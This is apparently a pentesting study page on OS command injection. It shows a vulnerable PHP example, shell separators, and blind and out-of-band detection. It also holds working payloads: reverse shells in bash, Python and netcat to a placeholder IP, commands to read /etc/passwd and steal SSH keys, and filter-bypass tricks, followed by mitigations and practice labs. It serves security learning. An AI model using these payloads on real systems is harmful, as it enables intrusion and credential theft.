---
layout: default
title: Command Injection
---

# Command Injection

## What is Command Injection

Command injection occurs when user input is passed unsanitised to a system shell command. An attacker can append their own commands and have them executed by the server with the same privileges as the web application.

---

## Why it Happens

A vulnerable PHP application might do this:

```php
<?php
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
?>
```

Normal use:
?ip=8.8.8.8

Runs: `ping -c 1 8.8.8.8`

Injected input:
?ip=8.8.8.8; id

Runs: `ping -c 1 8.8.8.8; id`

The server executes both commands and the attacker sees the output of `id`.

---

## Command Separators

These characters chain or inject commands in a shell:

| Separator | Behaviour | Example |
|-----------|-----------|---------|
| `;` | Run second command always | `cmd1; cmd2` |
| `&&` | Run second only if first succeeds | `cmd1 && cmd2` |
| `\|\|` | Run second only if first fails | `cmd1 \|\| cmd2` |
| `\|` | Pipe output of first into second | `cmd1 \| cmd2` |
| `` ` `` | Execute and substitute output | `` cmd1 `cmd2` `` |
| `$()` | Execute and substitute output | `cmd1 $(cmd2)` |
| `\n` | Newline — treated as new command | `cmd1%0acmd2` |

---

## Types of Command Injection

### In-band (Visible output)

The output of your injected command is returned in the HTTP response.
?ip=127.0.0.1; cat /etc/passwd

### Blind Command Injection

No output is returned. You prove execution through side effects.

**Time-based:**
?ip=127.0.0.1; sleep 5
If the response is delayed by 5 seconds, injection works.

**Out-of-band (DNS/HTTP):**
?ip=127.0.0.1; curl http://YOUR-COLLABORATOR-URL/
If your server receives a request, injection works.

Use Burp Collaborator or interactsh for OOB detection.

---

## Common Commands to Run After Injection

**Linux:**
```bash
id                        — current user and groups
whoami                    — current username
uname -a                  — kernel and OS info
cat /etc/passwd           — list users
ls /                      — root directory listing
cat /home/user/.ssh/id_rsa  — steal SSH key
which python3             — check available interpreters
```

**Windows:**
```cmd
whoami
ipconfig
net user
dir C:\Users
type C:\Windows\win.ini
```

---

## Getting a Reverse Shell via Command Injection

Once you confirm injection, get a proper interactive shell.

**Bash reverse shell:**
```bash
bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
```

**Python reverse shell:**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Netcat:**
```bash
nc -e /bin/sh YOUR-IP 4444
```

Set up your listener first:
```bash
nc -lvnp 4444
```

---

## Filter Bypass Techniques

Applications may block certain characters or keywords. Common bypasses:

```bash
# Space bypass — use ${IFS}
cat${IFS}/etc/passwd

# Space bypass — use tab %09
cat%09/etc/passwd

# Slash bypass
cat /etc/pa?sw?

# Keyword bypass — variable splitting
c''at /etc/passwd
c"a"t /etc/passwd

# Encoding
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
```

---

## Tools

- **Burp Suite** — intercept and fuzz parameters
- **commix** — automated command injection detection and exploitation

### commix example

```bash
commix --url="http://target.com/ping.php?ip=INJECT_HERE"
```

---

## Mitigations

- Never pass user input to shell functions — `system()`, `exec()`, `shell_exec()`, `popen()`
- Use language built-in functions instead of shell commands (e.g. PHP's `file_get_contents()` instead of `cat`)
- If shell commands are necessary, use parameterised interfaces — `escapeshellarg()` in PHP
- Whitelist allowed input values
- Run the web server as a low-privilege user
- Use a WAF

---

## Practice Labs

- TryHackMe: Command Injection room
- PortSwigger Web Academy: OS command injection labs
- DVWA: Command Injection module
- HackTheBox machines: Shocker, Cronos

---

## Key Terms

| Term | Meaning |
|------|---------|
| Command injection | Injecting OS commands through user input |
| In-band | Output visible in the HTTP response |
| Blind | No output — proved through side effects |
| OOB | Out-of-band — using DNS or HTTP callbacks |
| Separator | Characters that chain shell commands |
| Reverse shell | Target connects back to attacker's listener |
| IFS | Internal Field Separator — used to replace spaces |
